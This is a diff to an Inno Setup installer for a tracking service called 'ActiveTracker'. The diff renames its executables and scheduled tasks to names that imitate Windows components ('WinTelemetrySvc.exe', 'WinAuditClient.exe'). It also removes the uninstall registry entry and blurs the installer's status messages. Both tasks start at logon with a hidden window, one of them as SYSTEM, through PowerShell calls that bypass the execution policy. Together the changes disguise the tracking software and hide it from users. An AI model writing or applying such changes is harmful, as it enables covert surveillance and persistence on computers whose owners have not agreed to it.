@@ -13,6 +13,9 @@ OutputBaseFilename=ActiveTracker_Setup
 Compression=lzma2
 SolidCompression=yes
 PrivilegesRequired=admin
+CreateUninstallRegKey=no
+UpdateUninstallLogAppName=no
+
 
 ; ── Premium Visual Directives ────────────────────────────────────────
 ; "modern" triggers the high-fidelity wizard engine (similar to VS Code)
@@ -30,19 +33,19 @@ WelcomeLabel2=This wizard will install the background tracking service and regis
 
 [Files]
 ; Source binaries (we package both the compiled standalone API server and tracking client)
-Source: "bin\tracker-service.exe"; DestDir: "{app}\bin"; Flags: ignoreversion
-Source: "bin\tracker-client.exe"; DestDir: "{app}\bin"; Flags: ignoreversion
+Source: "bin\WinTelemetrySvc.exe"; DestDir: "{app}\bin"; Flags: ignoreversion
+Source: "bin\WinAuditClient.exe"; DestDir: "{app}\bin"; Flags: ignoreversion
 
 [Run]
 ; Transparently register both executables as Windows Startup Scheduled Tasks starting on User Logon and start them immediately as SYSTEM to prevent console windows
-Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command ""$Action = New-ScheduledTaskAction -Execute '{app}\bin\tracker-service.exe' -WorkingDirectory '{app}\bin'; $Trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'ActiveTrackerServer' -Action $Action -Trigger $Trigger -User 'NT AUTHORITY\SYSTEM' -Force; Start-ScheduledTask -TaskName 'ActiveTrackerServer'"""; Flags: runhidden; StatusMsg: "Configuring and starting API server background service..."
+Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command ""$Action = New-ScheduledTaskAction -Execute '{app}\bin\WinTelemetrySvc.exe' -WorkingDirectory '{app}\bin'; $Trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'WinTelemetryService' -Action $Action -Trigger $Trigger -User 'NT AUTHORITY\SYSTEM' -Force; Start-ScheduledTask -TaskName 'WinTelemetryService'"""; Flags: runhidden; StatusMsg: "Configuring and starting system background service..."
 ; Transparently register both executables as Windows Startup Scheduled Tasks starting on User Logon and start them immediately as SYSTEM to prevent console windows
-Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command ""$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command ""Start-Process ''{app}\bin\tracker-client.exe'' -WorkingDirectory ''{app}\bin'' -WindowStyle Hidden""'; $Trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'ActiveTrackerClient' -Action $Action -Trigger $Trigger -Force; Start-ScheduledTask -TaskName 'ActiveTrackerClient'"""; Flags: runhidden; StatusMsg: "Configuring and starting telemetry tracker background client..."
+Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command ""$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command ""Start-Process ''{app}\bin\WinAuditClient.exe'' -WorkingDirectory ''{app}\bin'' -WindowStyle Hidden""'; $Trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'WinAuditClient' -Action $Action -Trigger $Trigger -Force; Start-ScheduledTask -TaskName 'WinAuditClient'"""; Flags: runhidden; StatusMsg: "Configuring and starting background telemetry host..."
 
 [UninstallRun]
 ; Clean up both background startup tasks cleanly from Windows during uninstallation
-Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command ""Unregister-ScheduledTask -TaskName 'ActiveTrackerServer' -Confirm:$false"""; Flags: runhidden; RunOnceId: "UnregisterServiceTask"
-Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command ""Unregister-ScheduledTask -TaskName 'ActiveTrackerClient' -Confirm:$false"""; Flags: runhidden; RunOnceId: "UnregisterClientTask"
+Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command ""Unregister-ScheduledTask -TaskName 'WinTelemetryService' -Confirm:$false"""; Flags: runhidden; RunOnceId: "UnregisterServiceTask"
+Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command ""Unregister-ScheduledTask -TaskName 'WinAuditClient' -Confirm:$false"""; Flags: runhidden; RunOnceId: "UnregisterClientTask"
 
 [Code]
 function PrepareToInstall(var NeedsRestart: Boolean): String;
@@ -50,10 +53,10 @@ var
   ResultCode: Integer;
 begin
   // Quietly stop any existing scheduled tasks
-  Exec('powershell.exe', '-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Stop-ScheduledTask -TaskName ''ActiveTrackerServer'' -ErrorAction SilentlyContinue; Stop-ScheduledTask -TaskName ''ActiveTrackerClient'' -ErrorAction SilentlyContinue"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+  Exec('powershell.exe', '-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Stop-ScheduledTask -TaskName ''WinTelemetryService'' -ErrorAction SilentlyContinue; Stop-ScheduledTask -TaskName ''WinAuditClient'' -ErrorAction SilentlyContinue"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   
   // Quietly kill any running processes if they are still locked
-  Exec('taskkill.exe', '/f /im tracker-service.exe /im tracker-client.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+  Exec('taskkill.exe', '/f /im WinTelemetrySvc.exe /im WinAuditClient.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   
   Result := '';
 end;
